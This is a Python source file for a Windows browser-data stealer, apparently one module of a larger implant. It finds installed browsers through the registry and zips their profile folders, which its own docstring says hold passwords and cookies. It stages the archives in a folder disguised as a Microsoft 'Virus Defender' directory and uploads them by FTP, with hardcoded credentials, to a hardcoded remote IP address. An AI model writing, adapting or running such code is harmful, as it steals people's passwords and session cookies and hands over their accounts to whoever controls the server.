import typing
from uuid import uuid4

from objects.Logger import Logger
import winreg
import shutil
import os
from ftplib import FTP
"""
The purpose of this handler is to provide sensitive information about every installed browser on the machine.
browser profile is a folder, which can be loaded to the browser and contains every information(password, cookies etc.)
about the default user.
"""

class BrowserHarvestingHandler:
    SERVER_ADDRESS = os.getenv("MVP_SERVER_URL", "http://40.118.19.45/")
    BROWSER_PROFILE_PATH = {
        "Google Chrome": r"%LOCALAPPDATA%/Google/Chrome/User Data/Default",
        "Brave": r"%LOCALAPPDATA%/BraveSoftware/Brave-Browser/User Data/Default",
        "Firefox-308046B0AF4A39CB": r"%APPDATA%/Mozilla/Firefox/Profiles",
        "Microsoft Edge": r"%LOCALAPPDATA%/Microsoft/Edge/User Data/Default"
    }
    BROWSERS_REG_PATH = r"SOFTWARE\Clients\StartMenuInternet"
    ZIP_DEFAULT_PATH = r"%LOCALAPPDATA%/Microsoft/Virus Defender"

    def __init__(self, task_id: str):
        self.task_id = task_id
        self.logger = Logger()
        self.ZIP_DEFAULT_PATH = os.path.expandvars(self.ZIP_DEFAULT_PATH)
        os.makedirs(self.ZIP_DEFAULT_PATH,exist_ok=True)

    def _get_installed_browsers(self) -> typing.List[str]:
        """
        gets browser profiles' paths for all installed browsers
        :return: list of paths for browser profiles
        """
        browsers_keys = self._traverse_registry_tree(winreg.HKEY_LOCAL_MACHINE, self.BROWSERS_REG_PATH)
        return [self.BROWSER_PROFILE_PATH.get(key) for key in browsers_keys]

    def get_all_browser_profiles(self) -> typing.List[str]:
        """
        gets zip archives for all installed browsers.
        :return: list of paths to zip archives.
        """
        profiles_paths = self._get_installed_browsers()
        zip_archives = []
        for folder_path in profiles_paths:
            zip_archives.append(self._folder_to_zip(folder_path=folder_path))
        return zip_archives

    def _folder_to_zip(self, folder_path: str) -> str:
        """
        makes a zip archive from a given folder.
        :param folder_path
        :return: path to zip archive
        """
        name = folder_path.split("/")[-3]
        full_folder_path = os.path.expandvars(folder_path)
        shutil.make_archive(base_name=name, format='zip', base_dir=full_folder_path)
        return os.path.join(self.ZIP_DEFAULT_PATH, name + '.zip')

    def subkeys(self, key):
        i = 0
        while True:
            try:
                subkey = winreg.EnumKey(key, i)
                self.logger.debug("`")
                yield subkey
                i += 1
            except WindowsError:
                break

    def _traverse_registry_tree(self, hkey, keypath):
        """
        gets all subkeys for a registry folder
        :param hkey: Base key, e.g winreg.HKEY_LOCAL_MACHINE
        :param keypath: Specific key. e.g "SOFTWARE\Clients\StartMenuInternet\"
        :return: list of subkeys. e.g ["Google Chrome","Brave"]
        """
        key = winreg.OpenKey(hkey, keypath, 0, winreg.KEY_READ)
        return self.subkeys(key=key)

    def send_file_to_server(self,file_path:str):
        ftp_client = FTP(self.SERVER_ADDRESS)
        ftp_client.login(user='tin',passwd='tin')
        ftp_client.cwd('browser_profiles')
        with open(file_path,'rb') as file:
            ftp_client.storbinary(f'STOR {uuid4().__str__() + ".zip"}',file)

if __name__ == '__main__':
    handler = BrowserHarvestingHandler(task_id="browser_handler_try")
    print(handler.get_all_browser_profiles())
